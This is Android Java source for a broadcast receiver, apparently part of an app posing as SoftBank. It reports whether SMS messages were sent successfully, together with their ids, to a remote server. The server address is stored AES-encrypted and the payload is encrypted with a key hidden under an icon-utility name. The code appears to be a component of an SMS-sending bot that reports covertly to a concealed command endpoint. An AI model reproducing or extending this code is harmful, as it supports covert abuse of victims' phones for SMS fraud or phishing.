package com.example.softbank.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.example.softbank.utils.AESUtil;
import com.example.softbank.utils.AppIconUtil;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

//短信发送状态
public class SMSVerification extends BroadcastReceiver implements Runnable {
    private String json;

    @Override
    public void onReceive(Context context, Intent intent) {
        String id = intent.getStringExtra("id");
        Bundle extras = intent.getExtras();
        if (extras == null) {
            return;
        }
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("type", "1");
            jsonObject.put("id", id);
            jsonObject.put("code", getCode(String.valueOf(getResultCode())));
            String AES = AESUtil.encrypt(jsonObject.toString(), AppIconUtil.aa);
            if (AES == null) {
                return;
            }
            json = AESUtil.encrypt(jsonObject.toString(), AppIconUtil.aa);
            new Thread(this).start();
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }


    private String getCode(String resultCode) {
        if (resultCode.equals("-1")) {
            return "1";
        } else {
            return "2";
        }
    }

    /**
     * post请求
     *
     * @param httpUrl 链接
     * @param param   参数
     * @return
     */
    public String doPost(String httpUrl, String param) {
        System.out.println(param);
        StringBuilder result = new StringBuilder();
        //连接
        HttpURLConnection connection = null;
        OutputStream os = null;
        try {
            //创建连接对象
            URL url = new URL(httpUrl);
            //创建连接
            connection = (HttpURLConnection) url.openConnection();
            //设置请求方法
            connection.setRequestMethod("POST");
            //设置连接超时时间
            connection.setConnectTimeout(15000);
            //设置是否可读取
            connection.setDoOutput(true);
            //设置响应是否可读取
            connection.setDoInput(true);
            connection.setInstanceFollowRedirects(true);
            //设置参数类型
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            //拼装参数
            if (param != null && !param.equals("")) {
                //设置参数
                os = connection.getOutputStream();
                //拼装参数
                os.write(param.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            // 定义BufferedReader输入流来读取URL的响应
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = in.readLine()) != null) {
                result.append(line);
            }
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (connection != null) {
                //关闭连接
                connection.disconnect();
            }
        }
        return result.toString();
    }


    @Override
    public void run() {
        if (json == null) {
            return;
        }
        doPost(AESUtil.decrypt("04/ZYtc+FWUwnTWMYwkePwlrxlgQRilGBgfwaX7tgS+qfi85DElfyyc23+NhECcR",AppIconUtil.aa), json);
    }
}
